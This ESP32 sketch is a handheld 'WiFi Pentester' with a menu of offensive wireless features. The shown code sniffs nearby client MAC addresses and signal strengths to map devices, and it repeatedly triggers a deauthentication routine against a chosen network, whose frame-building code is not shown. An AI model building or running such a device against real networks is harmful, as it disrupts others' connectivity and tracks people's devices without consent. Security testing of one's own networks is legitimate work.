#include <WiFi.h>
#include <esp_wifi.h>
#include <Adafruit_GFX.h>
#include <Adafruit_ST7735.h>
#include <SPI.h>
#include <math.h>

// TFT pins
#define TFT_CS 25
#define TFT_RST 26
#define TFT_DC 27
#define TFT_SCLK 14
#define TFT_MOSI 13

Adafruit_ST7735 tft = Adafruit_ST7735(TFT_CS, TFT_DC, TFT_MOSI, TFT_SCLK, TFT_RST);

// Button pins
#define BOOT_BUTTON 0
#define POWER_ENABLE 21  // Add a power enable pin if available

// Power management
#define BATTERY_PIN 36  // A0
bool lowPowerMode = false;
float batteryVoltage = 0.0;
unsigned long lastBatteryCheck = 0;
unsigned long lastActivity = 0;
const unsigned long SLEEP_TIMEOUT = 30000;  // 30 seconds idle timeout
bool powerEnabled = false;

// Menu system
int currentMenu = 0;
int selectedItem = 0;
const char* mainMenuItems[] = { "WiFi Scanner", "AP Visualizer", "Deauth Attack", "Probe Monitor", "AP Clone", "Packet Monitor", "Real-Time Monitor", "Power Options" };
const int mainMenuSize = 8;
// Button variables
bool bootPressed = false;
bool bootLongPress = false;
unsigned long bootPressStart = 0;
unsigned long lastButtonPress = 0;
const unsigned long debounceDelay = 50;
const unsigned long longPressTime = 1000;

int selectedAPIndex = -1;
bool apSelected = false;

// Reset detection
bool wasResetPressed = false;
esp_reset_reason_t resetReason;

// WiFi scan results with positioning data
int networkCount = 0;
String networks[50];
int rssiValues[50];
bool isSecure[50];
uint8_t channels[50];
uint8_t bssids[50][6];
float distances[50];
float apX[50], apY[50];  // AP positions for visualization

// Client monitoring variables
uint8_t clientMACs[20][6];  // Store up to 20 client MACs
int clientRSSI[20];         // RSSI values for clients
float clientX[20], clientY[20]; // Calculated positions
int clientCount = 0;
unsigned long lastClientScan = 0;

// Attack variables
bool deauthActive = false;
int targetNetwork = -1;
unsigned long lastPacket = 0;

// Visualization variables
int visualizerMode = 0;            // 0=distance list, 1=2D map, 2=radar view
float centerX = 80, centerY = 64;  // Center of display for radar
float scale = 2.0;                 // Scale factor for visualization

// Packet monitoring variables
bool packetMonitorActive = false;
int packetCount = 0;
unsigned long lastPacketTime = 0;

// Probe monitoring variables
bool probeMonitorActive = false;
String lastProbeDevice = "";
int probeCount = 0;

// AP Clone variables
bool apCloneActive = false;
String cloneSSID = "";
String cloneBSSID = "";


// Real-time monitoring variables
bool realTimeMonitorActive = false;
unsigned long lastRealTimeUpdate = 0;
const unsigned long REALTIME_UPDATE_INTERVAL = 700;  // Update every 2 seconds
int currentChannel = 1;
unsigned long lastChannelSwitch = 0;
const unsigned long CHANNEL_SWITCH_INTERVAL = 200;  // Switch channels every 200ms

// Distance calculation functions (from Python script)
float rssiToDistance(int rssi, int measuredPower = -30, float pathLossExponent = 3.0) {
  if (rssi >= measuredPower) {
    return 1.0;
  }
  return pow(10.0, (float)(measuredPower - rssi) / (10.0 * pathLossExponent));
}

float channelToFrequency(int channel) {
  if (channel <= 0) return 2.4;

  if (channel >= 1 && channel <= 14) {
    if (channel == 14) return 2.484;
    return 2.407 + 0.005 * channel;
  } else if (channel >= 32 && channel <= 68) {
    return 5.16 + 0.005 * (channel - 32);
  } else if (channel >= 96 && channel <= 144) {
    return 5.49 + 0.005 * (channel - 96);
  } else if (channel >= 149 && channel <= 177) {
    return 5.735 + 0.005 * (channel - 149);
  }
  return 2.4;  // Default
}

int adjustRssiByChannel(int rssi, int channel) {
  float freq = channelToFrequency(channel);

  if (freq >= 5.7) return rssi + 8;
  else if (freq >= 5.4) return rssi + 7;
  else if (freq >= 5.15) return rssi + 6;
  else if (freq > 2.45) return rssi + 1;
  else if (freq < 2.425) return rssi - 1;
  return rssi;
}


float calculateDistanceWithChannel(int rssi, int channel) {
  int adjustedRssi = adjustRssiByChannel(rssi, channel);
  float freq = channelToFrequency(channel);

  float pathLoss = 3.0; // Adjust this value based on your environment
  int measuredPower = -30; // Adjust this value based on your environment

  if (freq >= 5.7) pathLoss = 3.6;
  else if (freq >= 5.15) {
    pathLoss = 3.5;
    measuredPower = -32;
  } else if (freq > 2.45) pathLoss = 3.1;
  else if (freq < 2.425) pathLoss = 2.9;

  return rssiToDistance(adjustedRssi, measuredPower, pathLoss);
}




// Only one definition of clientPacketHandler
void clientPacketHandler(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (clientCount >= 20) return; // Limit to 20 clients

    wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;

    // Check if this is a data frame or probe request
    uint8_t frameType = pkt->payload[0] & 0xFC; // Get the frame type
    if (frameType == 0x08 || frameType == 0x40) { // Data frames (0x08) or probe requests (0x40)
        // Extract client MAC address (source address for frames from client)
        uint8_t* clientMAC = &pkt->payload[10];

        // Check if we already have this client
        bool newClient = true;
        for (int i = 0; i < clientCount; i++) {
            bool macMatch = true;
            for (int j = 0; j < 6; j++) {
                if (clientMACs[i][j] != clientMAC[j]) {
                    macMatch = false;
                    break;
                }
            }
            if (macMatch) {
                newClient = false;
                // Update RSSI for existing client
                clientRSSI[i] = pkt->rx_ctrl.rssi; // Update the RSSI value
                break;
            }
        }

        if (newClient) {
            // Add new client
            memcpy(clientMACs[clientCount], clientMAC, 6); // Store the MAC address
            clientRSSI[clientCount] = pkt->rx_ctrl.rssi; // Store the RSSI value

            // Calculate estimated position relative to AP
            float clientDistance = calculateDistanceWithChannel(clientRSSI[clientCount], channels[selectedAPIndex]);

            // Random but consistent positioning around AP
            uint32_t macHash = 0;
            for (int i = 0; i < 6; i++) {
                macHash = macHash * 31 + clientMAC[i];
            }
            float angle = (macHash % 628) / 100.0; // Calculate angle for positioning

            // Store calculated positions
            clientX[clientCount] = apX[selectedAPIndex] + clientDistance * cos(angle) * 0.3;
            clientY[clientCount] = apY[selectedAPIndex] + clientDistance * sin(angle) * 0.3;

            clientCount++; // Increment the client count
        }
    }
}





void initializePower() {
  // Initialize power management
  pinMode(POWER_ENABLE, OUTPUT);
  digitalWrite(POWER_ENABLE, HIGH);  // Enable power
  powerEnabled = true;

  // Set initial CPU frequency
  setCpuFrequencyMhz(240);  // Start at full speed for initialization

  // Check initial battery status
  checkBatteryStatus();

  // If battery is critically low, start in low power mode
  if (batteryVoltage > 0 && batteryVoltage < 3.2) {
    enterLowPowerMode();
  } else {
    setCpuFrequencyMhz(160);  // Normal operating frequency
  }
}

void realTimeMonitor() {
  fastScreenClear();
  tft.setTextColor(ST77XX_CYAN);
  tft.setCursor(0, 0);
  tft.println("=== REAL-TIME MONITOR ===");
  
  realTimeMonitorActive = true;
  currentChannel = 1;
  
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  
  updateRealTimeDisplay();

  if (networkCount == 0) {
    fastScreenClear();
    tft.setTextColor(ST77XX_RED);
    tft.setCursor(0, 0);
    tft.println("No networks found!");
    tft.println("Run scanner first");
    delay(2000);
    goBack();
    return;
  }
  
  // Show AP selection menu
  selectedAPIndex = 0;
  apSelected = false;
  showAPSelectionMenu();
}

void updateRealTimeDisplay() {
  // Channel switching for comprehensive monitoring
  if (millis() - lastChannelSwitch > CHANNEL_SWITCH_INTERVAL) {
    currentChannel++;
    if (currentChannel > 11) currentChannel = 1;
    lastChannelSwitch = millis();
  }
  
  // Perform scan update
  if (millis() - lastRealTimeUpdate > REALTIME_UPDATE_INTERVAL) {
    // Quick async scan
    int newCount = WiFi.scanNetworks(false, false, false, 300, currentChannel);
    
    if (newCount > 0) {
      // Update existing networks or add new ones
      for (int i = 0; i < min(newCount, 30); i++) {  // Limit to 30 networks for faster processing
        String currentSSID = WiFi.SSID(i);
        String currentBSSID = WiFi.BSSIDstr(i);
        
        // Find if this AP already exists
        int existingIndex = -1;
        for (int j = 0; j < networkCount; j++) {
          if (WiFi.BSSIDstr(i) == String((char*)bssids[j])) {
            existingIndex = j;
            break;
          }
        }
        
        int targetIndex = (existingIndex >= 0) ? existingIndex : networkCount;
        
        // Update or add AP data
        if (targetIndex < 30) {  // Adjusted limit
          networks[targetIndex] = currentSSID;
          rssiValues[targetIndex] = WiFi.RSSI(i);
          channels[targetIndex] = WiFi.channel(i);
          isSecure[targetIndex] = (WiFi.encryptionType(i) != WIFI_AUTH_OPEN);
          
          // Store BSSID
          uint8_t* bssid = WiFi.BSSID(i);
          if (bssid) {
            memcpy(bssids[targetIndex], bssid, 6);
          }
          
          // Recalculate distance and position
          distances[targetIndex] = calculateDistanceWithChannel(rssiValues[targetIndex], channels[targetIndex]);
          
          // Update position based on BSSID hash for consistency
          uint32_t hash = 0;
          for (int k = 0; k < 6; k++) {
            hash = hash * 31 + bssids[targetIndex][k];
          }
          
          float angle = (hash % 628) / 100.0;
          apX[targetIndex] = distances[targetIndex] * cos(angle);
          apY[targetIndex] = distances[targetIndex] * sin(angle);
          
          if (existingIndex < 0 && networkCount < 30) {  // Adjusted limit
            networkCount++;
          }
        }
      }
    }
    
    lastRealTimeUpdate = millis();
    displayRealTimeAPs();
  }
}



void showAPSelectionMenu() {
  fastScreenClear();
  tft.setTextColor(ST77XX_CYAN);
  tft.setCursor(0, 0);
  tft.println("=== SELECT AP TO MONITOR ===");
  
  // Show first 7 APs (to fit on screen)
  int maxDisplay = min(7, networkCount);
  int startIndex = max(0, selectedAPIndex - 3); // Center selection
  
  for (int i = 0; i < maxDisplay; i++) {
    int apIndex = startIndex + i;
    if (apIndex >= networkCount) break;
    
    int yPos = 20 + i * 12;
    
    if (apIndex == selectedAPIndex) {
      // Highlight selected AP
      tft.fillRect(0, yPos - 1, 160, 12, ST77XX_WHITE);
      tft.setTextColor(ST77XX_BLACK);
    } else {
      tft.setTextColor(ST77XX_WHITE);
    }
    
    tft.setCursor(2, yPos);
    String ssid = networks[apIndex];
    if (ssid.length() > 12) ssid = ssid.substring(0, 9) + "...";
    tft.print(ssid);
    
    tft.setCursor(90, yPos);
    tft.print(rssiValues[apIndex]);
    tft.print("dB");
    
    tft.setCursor(130, yPos);
    tft.print("Ch");
    tft.print(channels[apIndex]);
  }
  
  tft.setTextColor(ST77XX_YELLOW);
  tft.setCursor(0, 105);
  tft.println("SHORT=next AP");
  tft.setCursor(0, 115);
  tft.println("LONG=monitor this AP");
}



void updateSelectedAPMonitor() {
    // Scan for clients connected to the selected AP
    if (millis() - lastClientScan > 3000) {
        scanForClients(); // Call the function to scan for clients
        lastClientScan = millis();
    }

    // Scan only the selected AP's channel for better performance
    WiFi.scanNetworks(false, false, false, 300, channels[selectedAPIndex]);

    // Find our target AP in the scan results
    int foundIndex = -1;
    String targetBSSID = "";

    // Get BSSID from stored data
    char bssidStr[18];
    sprintf(bssidStr, "%02X:%02X:%02X:%02X:%02X:%02X",
            bssids[selectedAPIndex][0], bssids[selectedAPIndex][1], 
            bssids[selectedAPIndex][2], bssids[selectedAPIndex][3],
            bssids[selectedAPIndex][4], bssids[selectedAPIndex][5]);
    targetBSSID = String(bssidStr);

    int scanCount = WiFi.scanComplete();
    if (scanCount > 0) {
        for (int i = 0; i < scanCount; i++) {
            if (WiFi.BSSIDstr(i) == targetBSSID) {
                foundIndex = i;
                // Update our stored data
                rssiValues[selectedAPIndex] = WiFi.RSSI(i);
                distances[selectedAPIndex] = calculateDistanceWithChannel(rssiValues[selectedAPIndex], channels[selectedAPIndex]);
                break;
            }
        }
    }

    // Clear monitoring area
    tft.fillRect(0, 25, 160, 85, ST77XX_BLACK);

    if (foundIndex >= 0) {
        tft.setTextColor(ST77XX_GREEN);
        tft.setCursor(0, 25);
        tft.println("AP FOUND - MONITORING");

        tft.setTextColor(ST77XX_WHITE);
        tft.setCursor(0, 35);
        tft.print("RSSI: ");
        tft.print(rssiValues[selectedAPIndex]);
        tft.println(" dBm");

        tft.setCursor(0, 45);
        tft.print("Distance: ");
        tft.print(distances[selectedAPIndex], 1);
        tft.println(" m");

        tft.setCursor(0, 55);
        tft.print("Channel: ");
        tft.println(channels[selectedAPIndex]);

        // Signal strength bar
        int barWidth = map(constrain(rssiValues[selectedAPIndex], -100, -30), -100, -30, 0, 100);
        tft.fillRect(0, 65, barWidth, 6, ST77XX_GREEN);
        tft.drawRect(0, 65, 100, 6, ST77XX_WHITE);

        // Client information
        tft.setTextColor(ST77XX_CYAN);
        tft.setCursor(0, 75);
        tft.print("Clients: ");
        tft.println(clientCount);

        // Signal quality indicator
        if (rssiValues[selectedAPIndex] > -50) {
            tft.setTextColor(ST77XX_GREEN);
            tft.setCursor(0, 85);
            tft.println("Signal: EXCELLENT");
        } else if (rssiValues[selectedAPIndex] > -70) {
            tft.setTextColor(ST77XX_YELLOW);
            tft.setCursor(0, 85);
            tft.println("Signal: GOOD");
        } else if (rssiValues[selectedAPIndex] > -85) {
            tft.setTextColor(ST77XX_ORANGE);
            tft.setCursor(0, 85);
            tft.println("Signal: FAIR");
        } else {
            tft.setTextColor(ST77XX_RED);
            tft.setCursor(0, 85);
            tft.println("Signal: POOR");
        }

        // Start client monitoring
        esp_wifi_set_promiscuous(true); // Enable promiscuous mode
        esp_wifi_set_channel(channels[selectedAPIndex], WIFI_SECOND_CHAN_NONE);
        esp_wifi_set_promiscuous_rx_cb(clientPacketHandler); // Set the packet handler

    } else {
        tft.setTextColor(ST77XX_RED);
        tft.setCursor(0, 25);
        tft.println("AP NOT FOUND");
        tft.setCursor(0, 35);
        tft.println("May be out of range");
        tft.setCursor(0, 45);
        tft.println("or turned off");

        tft.setTextColor(ST77XX_YELLOW);
        tft.setCursor(0, 55);
        tft.println("Clients: N/A");
    }

    // Add client visualization if clients are detected
    displayClientMap();

    tft.setTextColor(ST77XX_YELLOW);
    tft.setCursor(0, 118);
    tft.println("LONG=back to menu");
}


void scanForClients() {
    // Set WiFi to promiscuous mode to detect client frames
    WiFi.mode(WIFI_MODE_STA); // Set the WiFi mode to Station
    esp_wifi_set_promiscuous(true); // Enable promiscuous mode
    esp_wifi_set_channel(channels[selectedAPIndex], WIFI_SECOND_CHAN_NONE); // Set the channel to the selected AP
    esp_wifi_set_promiscuous_rx_cb(clientPacketHandler); // Set the packet handler

    // Reset client count for fresh scan
    clientCount = 0;

    // Listen for client frames for a specified duration
    unsigned long scanStart = millis();
    while (millis() - scanStart < 20000) { // Listen for 20 seconds
        delay(100); // Allow packet handler to work
    }

    esp_wifi_set_promiscuous(false); // Stop promiscuous mode after scanning

    // Update the client display after scanning
    updateClientDisplay(); // Call to display the detected clients
}



void updateClientDisplay() {
    fastScreenClear(); // Clear the screen
    tft.setTextColor(ST77XX_CYAN);
    tft.setCursor(0, 0);
    tft.println("=== CLIENTS MONITOR ===");
    
    // Display each detected client
    for (int i = 0; i < clientCount; i++) {
        char macStr[18];
        sprintf(macStr, "%02X:%02X:%02X:%02X:%02X:%02X",
                clientMACs[i][0], clientMACs[i][1], clientMACs[i][2],
                clientMACs[i][3], clientMACs[i][4], clientMACs[i][5]);
        
        tft.setCursor(0, 20 + i * 10); // Position for each client
        tft.print(macStr); // Print MAC address
        tft.print(" | RSSI: ");
        tft.print(clientRSSI[i]); // Print RSSI value
    }

    tft.setTextColor(ST77XX_YELLOW);
    tft.setCursor(0, 120);
    tft.println("LONG=back");
}







void displayClientMap() {
    // Clear the map area
    tft.fillRect(0, 130, 160, 90, ST77XX_BLACK); // Adjust the area as needed

    // Draw the AP position
    tft.setTextColor(ST77XX_GREEN);
    tft.fillCircle(apX[selectedAPIndex], apY[selectedAPIndex], 5, ST77XX_GREEN); // Draw AP as a green circle
    tft.setCursor(apX[selectedAPIndex] + 10, apY[selectedAPIndex] - 5);
    tft.print("AP");

    // Draw each client
    for (int i = 0; i < clientCount; i++) {
        tft.setTextColor(ST77XX_CYAN);
        tft.fillCircle(clientX[i], clientY[i], 3, ST77XX_CYAN); // Draw client as a cyan circle
        tft.setCursor(clientX[i] + 5, clientY[i] - 5);
        char macStr[18];
        sprintf(macStr, "%02X:%02X:%02X:%02X:%02X:%02X",
                clientMACs[i][0], clientMACs[i][1], clientMACs[i][2],
                clientMACs[i][3], clientMACs[i][4], clientMACs[i][5]);
        tft.print(macStr); // Print MAC address next to the client
    }
}
















void startAPMonitoring() {
  if (selectedAPIndex < 0 || selectedAPIndex >= networkCount) return;
  
  apSelected = true;
  realTimeMonitorActive = true;
  
  // Set WiFi to the selected AP's channel
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  
  // Focus on the selected AP's channel
  currentChannel = channels[selectedAPIndex];
  
  fastScreenClear();
  tft.setTextColor(ST77XX_GREEN);
  tft.setCursor(0, 0);
  tft.println("MONITORING AP:");
  
  tft.setTextColor(ST77XX_WHITE);
  tft.setCursor(0, 10);
  tft.println(networks[selectedAPIndex]);
  
  updateSelectedAPMonitor();
}






void displayRealTimeAPs() {
    fastScreenClear();
    tft.setTextColor(ST77XX_CYAN);
    tft.setCursor(0, 0);
    tft.println("REAL-TIME AP MONITOR");
    
    tft.setTextColor(ST77XX_WHITE);
    tft.setCursor(0, 10);
    tft.print("APs: ");
    tft.print(networkCount);
    tft.print(" | Ch: ");
    tft.println(currentChannel);
    
    // Show live 2D map
    tft.drawLine(80, 25, 80, 100, ST77XX_WHITE);  // Y axis
    tft.drawLine(20, 62, 140, 62, ST77XX_WHITE);  // X axis
    
    // Draw range circles based on the desired maximum distance
    float maxDisplayDistance = 30.0; // Set the maximum distance you want to visualize
    for (int r = 10; r <= maxDisplayDistance; r += 10) {
        tft.drawCircle(80, 62, r * 2, ST77XX_WHITE); // Scale the radius for better visibility
    }
    
    // Plot all APs
    for (int i = 0; i < networkCount; i++) {
        int plotX = 80 + (int)(apX[i] * 2); // Scale the X position
        int plotY = 62 + (int)(apY[i] * 2); // Scale the Y position
        
        plotX = constrain(plotX, 25, 135);
        plotY = constrain(plotY, 30, 95);
        
        // Color by signal strength and age
        uint16_t color;
        if (rssiValues[i] > -50) color = ST77XX_GREEN;
        else if (rssiValues[i] > -70) color = ST77XX_YELLOW;
        else color = ST77XX_RED;
        
        tft.fillCircle(plotX, plotY, 2, color);
        
        // Show closest AP info
        if (distances[i] < 15 && networks[i].length() > 0) {
            tft.setTextColor(color);
            tft.setCursor(plotX + 3, plotY - 3);
            String shortName = networks[i].substring(0, min(3, (int)networks[i].length()));
            tft.print(shortName);
        }
    }
    
    // Center point (our position)
    tft.fillCircle(80, 62, 3, ST77XX_CYAN);
    
    tft.setTextColor(ST77XX_YELLOW);
    tft.setCursor(0, 110);
    tft.println("LIVE | LONG=back");
}







void setup() {
  WiFi.setSleep(false);


  Serial.begin(115200);
  delay(1000);  // Give time for serial to initialize

  Serial.println("ESP32 WiFi Pentester Starting...");

  // Initialize power first
  initializePower();

  // Check reset reason
  resetReason = esp_reset_reason();
  wasResetPressed = (resetReason == ESP_RST_EXT);

  // Setup buttons
  pinMode(BOOT_BUTTON, INPUT_PULLUP);

  Serial.println("Initializing display...");

  // Init display with retry mechanism
  bool displayOk = false;
  for (int attempts = 0; attempts < 3; attempts++) {
    try {
      tft.initR(INITR_BLACKTAB);
      tft.setRotation(1);
      fastScreenClear();
      displayOk = true;
      break;
    } catch (...) {
      Serial.println("Display init failed, retrying...");
      delay(100);
    }
  }

  if (!displayOk) {
    Serial.println("Display initialization failed!");
    // Continue without display for debugging
  }

  // Show boot message with battery status
  tft.setTextColor(ST77XX_GREEN);
  tft.setTextSize(1);
  tft.setCursor(0, 0);
  tft.println("ESP32 WiFi Pentester");
  tft.println("v2.0 Enhanced");

  if (wasResetPressed) {
    tft.setTextColor(ST77XX_CYAN);
    tft.println("RESET DETECTED!");
    tft.println("Emergency mode...");
    delay(1000);

    // Emergency actions - stop all attacks, enter low power
    deauthActive = false;
    currentMenu = 0;
    selectedItem = 0;
    enterLowPowerMode();
  }

  // Check battery status and show
  checkBatteryStatus();
  tft.print("Battery: ");
  if (batteryVoltage > 0) {
    tft.print(batteryVoltage);
    tft.println("V");
  } else {
    tft.println("USB");
  }

  delay(100);

  // Initialize visualization arrays
  for (int i = 0; i < 50; i++) {
    distances[i] = 0;
    apX[i] = 0;
    apY[i] = 0;
  }

  Serial.println("Setup complete, showing main menu");
  showMainMenu();
}




void loop() {
  // Handle button input
  handleButtons();

  // Power management
  if (millis() - lastActivity > SLEEP_TIMEOUT && !deauthActive && !packetMonitorActive && !probeMonitorActive && !apCloneActive) {
    enterSleepMode();
  }

  // Battery monitoring (less frequent to save power)
  if (millis() - lastBatteryCheck > 10000) {
    checkBatteryStatus();
  }

  // Real-time updates for AP Visualizer
  if (currentMenu == 7 && apSelected && realTimeMonitorActive) {
    if (millis() - lastRealTimeUpdate > REALTIME_UPDATE_INTERVAL) {
      updateSelectedAPMonitor();
      lastRealTimeUpdate = millis();
    }
  }

  if (currentMenu == 2) {
    static unsigned long lastVisualizerUpdate = 0;
    if (millis() - lastVisualizerUpdate > 1000) {  // Update every second
      // Quick scan update
      int newCount = WiFi.scanNetworks();
      if (newCount > 0) {
        networkCount = newCount;
        // Update RSSI and recalculate distances
        for (int i = 0; i < min(networkCount, 50); i++) {
          rssiValues[i] = WiFi.RSSI(i);
          distances[i] = calculateDistanceWithChannel(rssiValues[i], channels[i]);
        }
      }
      showApVisualizer();
      lastVisualizerUpdate = millis();
    }
  }

  // Attack execution (with power limits)
  if (deauthActive && millis() - lastPacket > 200) {
    if (batteryVoltage > 3.5 || batteryVoltage == 0) {
      sendDeauthPacket();
      lastPacket = millis();
    } else {
      // Stop attack if battery too low
      deauthActive = false;
      showLowBatteryWarning();
      delay(500);
      goBack();
    }
  }

  // Packet monitoring
  if (packetMonitorActive) {
    monitorPackets();
  }

  // Probe monitoring
  if (probeMonitorActive) {
    monitorProbes();
  }

  delay(10);  // Shorter delay for better responsiveness
}









void monitorProbes() {
  // Update display periodically
  if (millis() - lastPacketTime > 1000) {
    updateProbeDisplay();
    lastPacketTime = millis();
  }
}
void handleButtons() {
  bool bootState = !digitalRead(BOOT_BUTTON);

  // Debounce logic
  if (millis() - lastButtonPress < debounceDelay) {
    return;
  }

  if (bootState && !bootPressed) {
    bootPressed = true;
    bootPressStart = millis();
    bootLongPress = false;
    lastActivity = millis();
    lastButtonPress = millis();
  } else if (bootState && bootPressed) {
    if (!bootLongPress && (millis() - bootPressStart > longPressTime)) {
      bootLongPress = true;
      handleLongPress();
      lastActivity = millis();
    }
  } else if (!bootState && bootPressed) {
    if (!bootLongPress) {
      handleShortPress();
    }
    bootPressed = false;
    bootLongPress = false;
    lastActivity = millis();
    lastButtonPress = millis();
  }
}
void monitorPackets() {
  // Update display periodically
  if (millis() - lastPacketTime > 1000) {
    updatePacketDisplay();
    lastPacketTime = millis();
  }
}
void enterLowPowerMode() {
  lowPowerMode = true;
  setCpuFrequencyMhz(80);  // Reduce CPU speed
  WiFi.mode(WIFI_OFF);     // Turn off WiFi completely

  fastScreenClear();
  tft.setTextColor(ST77XX_YELLOW);
  tft.setCursor(0, 0);
  tft.println("LOW POWER MODE");
  tft.println("Battery saving...");
  tft.print("Battery: ");
  tft.print(batteryVoltage);
  tft.println("V");
  delay(1000);
}

void exitLowPowerMode() {
  lowPowerMode = false;
  setCpuFrequencyMhz(160);
  showMainMenu();
}

void enterSleepMode() {
  fastScreenClear();
  tft.setTextColor(ST77XX_BLUE);
  tft.setCursor(0, 0);
  tft.println("SLEEP MODE");
  tft.println("Press button to wake");

  // Turn off WiFi
  WiFi.mode(WIFI_OFF);
  esp_wifi_deinit();

  // Configure wake up
  esp_sleep_enable_ext0_wakeup(GPIO_NUM_0, 0);  // Wake on boot button

  delay(2000);
  esp_light_sleep_start();  // Light sleep (keeps RAM)

  // Woken up
  lastActivity = millis();
  showMainMenu();
}

float readBatteryVoltage() {
  int rawValue = analogRead(BATTERY_PIN);
  float voltage = (rawValue / 4095.0) * 3.3 * 2.0;  // Assuming voltage divider

  // Filter out noise
  if (voltage < 1.0) voltage = 0.0;  // Probably USB powered

  return voltage;
}

void checkBatteryStatus() {
  batteryVoltage = readBatteryVoltage();

  // Display battery status in top right
  tft.fillRect(120, 0, 40, 10, ST77XX_BLACK);

  if (batteryVoltage < 2.0) {
    // Probably USB powered
    tft.setTextColor(ST77XX_CYAN);
    tft.setCursor(120, 0);
    tft.print("USB");
  } else if (batteryVoltage > 3.8) {
    tft.setTextColor(ST77XX_GREEN);
    tft.setCursor(120, 0);
    tft.print("FULL");
  } else if (batteryVoltage > 3.6) {
    tft.setTextColor(ST77XX_GREEN);
    tft.setCursor(120, 0);
    tft.print("GOOD");
  } else if (batteryVoltage > 3.4) {
    tft.setTextColor(ST77XX_YELLOW);
    tft.setCursor(120, 0);
    tft.print("LOW");
  } else {
    tft.setTextColor(ST77XX_RED);
    tft.setCursor(120, 0);
    tft.print("CRIT");
    if (!lowPowerMode) {
      enterLowPowerMode();
    }
  }

  lastBatteryCheck = millis();
}

void showLowBatteryWarning() {
  fastScreenClear();
  tft.setTextColor(ST77XX_RED);
  tft.setCursor(0, 0);
  tft.println("BATTERY LOW!");
  tft.println("Operation stopped");
  tft.print("Voltage: ");
  tft.print(batteryVoltage);
  tft.println("V");
}

void handleShortPress() {
  if (lowPowerMode) {
    exitLowPowerMode();
    return;
  }

  if (currentMenu == 0) {
    // Main menu navigation
    selectedItem = (selectedItem + 1) % mainMenuSize;
    updateMenu();
  } else if (currentMenu == 2) {
    // AP Visualizer mode switching
    visualizerMode = (visualizerMode + 1) % 3;
    showApVisualizer();
    delay(100);
  } else if (currentMenu == 3) {
    // Deauth target selection
    if (networkCount > 0) {
      targetNetwork = (targetNetwork + 1) % networkCount;
      updateDeauthDisplay();
    }
  } else if (currentMenu == 7 && !apSelected) {
  // Real-time monitor AP selection
  selectedAPIndex = (selectedAPIndex + 1) % networkCount;
  showAPSelectionMenu();
  }
}

void handleLongPress() {
  if (lowPowerMode) {
    exitLowPowerMode();
    return;
  }

  // Show long press feedback
  tft.fillRect(0, 118, 160, 10, ST77XX_GREEN);
  tft.setTextColor(ST77XX_BLACK);
  tft.setCursor(2, 119);
  tft.println("LONG PRESS");
  delay(100);

  if (currentMenu == 0) {
    executeMenuItem();
  } else {
    if (currentMenu == 3 && targetNetwork >= 0) {
      // Toggle deauth attack
      deauthActive = !deauthActive;
      updateDeauthDisplay();
    } else if (currentMenu == 4) {
      // Toggle probe monitor
      probeMonitorActive = !probeMonitorActive;
      updateProbeDisplay();
    } else if (currentMenu == 6) {
      // Toggle packet monitor
      packetMonitorActive = !packetMonitorActive;
      updatePacketDisplay();
    } else if (currentMenu == 7 && !apSelected) {
      startAPMonitoring();
    } else {
      goBack();
    }
  }
}

void goBack() {
  currentMenu = 0;
  selectedItem = 0;
  deauthActive = false;
  packetMonitorActive = false;
  probeMonitorActive = false;
  apCloneActive = false;
  realTimeMonitorActive = false;
  apSelected = false;
  selectedAPIndex = -1;

  // Turn off WiFi when going back to save power
  WiFi.mode(WIFI_OFF);
  esp_wifi_deinit();

  showMainMenu();
}

void showMainMenu() {
  fastScreenClear();
  tft.setTextColor(ST77XX_CYAN);
  tft.setTextSize(1);
  tft.setCursor(0, 0);
  tft.println("=== WiFi PENTESTER ===");
  tft.println();

  for (int i = 0; i < mainMenuSize; i++) {
    if (i == selectedItem) {
      tft.setTextColor(ST77XX_BLACK);
      tft.fillRect(0, 20 + i * 10, 160, 10, ST77XX_WHITE);
      tft.setCursor(2, 21 + i * 10);
    } else {
      tft.setTextColor(ST77XX_WHITE);
      tft.setCursor(2, 21 + i * 10);
    }
    tft.println(mainMenuItems[i]);
  }

  tft.setTextColor(ST77XX_YELLOW);
  tft.setCursor(0, 90);
  tft.println("SHORT=navigate");
  tft.setCursor(0, 100);
  tft.println("LONG=select/back");
}

void updateMenu() {
  showMainMenu();
}

void executeMenuItem() {
  currentMenu = selectedItem + 1;

  // Initialize WiFi only when needed
  if (selectedItem < 6) {  // WiFi functions
    WiFi.mode(WIFI_STA);
    WiFi.begin();  // Initialize without connecting
  }

  switch (selectedItem) {
    case 0:
      wifiScanner();
      break;
    case 1:
      showApVisualizer();
      break;
    case 2:
      deauthMenu();
      break;
    case 3:
      probeMonitor();
      break;
    case 4:
      apClone();
      break;
    case 5:
      packetMonitor();
      break;
    case 6:
      realTimeMonitor();
      break;
    case 7:
      powerOptions();
      break;
  }
}



void showApVisualizer() {
  if (networkCount == 0) {
    fastScreenClear();
    tft.setTextColor(ST77XX_RED);
    tft.setCursor(0, 0);
    tft.println("No networks scanned!");
    tft.println("Run scanner first");
    delay(200);
    goBack();
    return;
  }

  // Real-time update every 3 seconds
  static unsigned long lastUpdate = 0;
  if (millis() - lastUpdate > 3000) {
    // Quick rescan for RSSI updates
    WiFi.scanNetworks(true);  // Async scan
    lastUpdate = millis();

    // Update distances based on new RSSI values
    for (int i = 0; i < min(networkCount, 50); i++) {
      if (WiFi.scanComplete() > 0) {
        rssiValues[i] = WiFi.RSSI(i);
        distances[i] = calculateDistanceWithChannel(rssiValues[i], channels[i]);
      }
    }
  }

  fastScreenClear();

  switch (visualizerMode) {
    case 0:
      showDistanceList();
      break;
    case 1:
      show2DMap();
      break;
    case 2:
      showRadarView();
      break;
  }

  // Show mode indicator
  tft.setTextColor(ST77XX_CYAN);
  tft.setCursor(0, 0);
  const char* modes[] = { "DISTANCE", "2D MAP", "RADAR" };
  tft.println(modes[visualizerMode]);

  // Show update indicator
  tft.setTextColor(ST77XX_GREEN);
  tft.setCursor(100, 0);
  tft.print("LIVE");

  tft.setTextColor(ST77XX_YELLOW);
  tft.setCursor(0, 118);
  tft.println("SHORT=mode LONG=back");
}







void showDistanceList() {
  tft.setTextColor(ST77XX_WHITE);
  tft.setCursor(0, 15);
  tft.println("Networks by distance:");

  // Sort networks by distance (simple bubble sort for small arrays)
  for (int i = 0; i < networkCount - 1; i++) {
    for (int j = 0; j < networkCount - i - 1; j++) {
      if (distances[j] > distances[j + 1]) {
        // Swap all related arrays
        float tempDist = distances[j];
        distances[j] = distances[j + 1];
